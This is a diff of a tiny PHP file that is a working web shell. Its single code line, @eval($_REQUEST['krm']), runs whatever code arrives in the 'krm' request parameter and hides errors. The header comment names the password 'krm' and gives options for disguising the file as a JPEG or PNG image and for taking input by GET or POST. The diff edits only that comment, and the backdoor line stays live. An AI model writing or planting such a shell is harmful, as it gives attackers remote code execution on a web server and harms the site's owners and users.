@@ -1,9 +1,15 @@
 <?php
 /*
-default OPTIONS
+Args:
     PASSWORD: krm
-    MIME Type: text/php (images/jpeg)
-    Request Method: $_REQUEST ($_GET | $_POST)
+    MIME Type: text/php
+        OPTIONS:
+            image/jpeg
+            image/png
+    Request Method: $_REQUEST
+        OPTIONS:
+            $_GET
+            $_POST
 */
 @eval($_REQUEST['krm']);
 ?>
